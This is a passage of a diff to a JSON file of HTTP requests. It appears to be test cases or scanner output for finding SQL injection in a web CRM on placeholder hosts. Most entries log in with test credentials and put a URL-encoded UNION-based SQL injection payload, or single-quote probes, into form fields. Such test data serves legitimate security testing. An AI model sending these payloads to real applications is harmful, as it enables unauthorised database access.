+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/groups?Groups_sort=name", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes?Quote_sort=lastActivity", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/2", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/2", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/profile/settings/", 
+    "param": {
+      "preferences[gridViewRowColorEven]": [
+        "a"
+      ], 
+      "preferences[pageHeaderBgColor]": [
+        "a"
+      ], 
+      "preferences[menuTextColor]": [
+        "a"
+      ], 
+      "Profile[allowPost]": [
+        "1"
+      ], 
+      "preferences[gridViewRowColorOdd]": [
+        "a"
+      ], 
+      "preferences[menuBgColor]": [
+        "a"
+      ], 
+      "preferences[backgroundColor]": [
+        "a"
+      ], 
+      "preferences[pageHeaderTextColor]": [
+        "a"
+      ], 
+      "preferences[activityFeedWidgetBgColor]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/mobile/contacts/search/", 
+    "param": {
+      "Contacts[lastName]": [
+        "Last Name'"
+      ], 
+      "Contacts[firstName]": [
+        "First Name"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/charts/sales", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Contacts[firstName]": [
+        "First Name"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=lastUpdated&Media_sort=uploadedBy", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=createDate&Media_sort=uploadedBy", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=createdBy&Media_sort=createDate", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/charts/pipeline", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/charts/pipeline", 
+    "param": {
+      "X2PipelineChartModel[limitTo]": [
         "0"
       ], 
-      "user_id": [
-        "4'"
+      "X2PipelineChartModel[dateRange]": [
+        "a"
       ], 
-      "userfilter": [
-        "0"
-      ], 
-      "op": [
-        "edit"
+      "X2PipelineChartModel[confidence]": [
+        "a'"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/user.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/user.php?groupfilter=0&user_id=4'&userfilter=0&op=edit", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
-    "type": "GET"
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/charts/pipeline", 
+    "param": {
+      "X2PipelineChartModel[limitTo]": [
+        "0"
+      ], 
+      "X2PipelineChartModel[dateRange]": [
+        "a"
+      ], 
+      "X2PipelineChartModel[confidence]": [
+        "a'"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/charts/marketing", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name&Media_sort=fileName", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name&Media_sort=fileName", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=createdBy.desc&Media_sort=createDate", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name.desc&Media_sort=createDate", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name.desc&Media_sort=createDate.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name.desc&Media_sort=uploadedBy", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name.desc&Media_sort=uploadedBy", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=lastUpdated.desc&Media_sort=createDate.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=createdBy.desc&Media_sort=createDate.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=lastUpdated.desc&Media_sort=fileName", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name.desc&Media_sort=uploadedBy.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name&Media_sort=uploadedBy.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Media_sort=fileName", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name.desc&Media_sort=fileName.desc", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=lastUpdated", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=createdBy", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=name", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs/createQuote", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs/create", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/4", 
+    "param": {
+      "Actions[associationType]": [
+        "media%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Actions[dueDate]": [
+        "a"
+      ], 
+      "SelectedTab": [
+        "a"
+      ], 
+      "Actions[associationId]": [
+        "4"
+      ], 
+      "Actions[actionDescription]": [
+        "a"
+      ], 
+      "Actions[completeDate]": [
+        "a"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
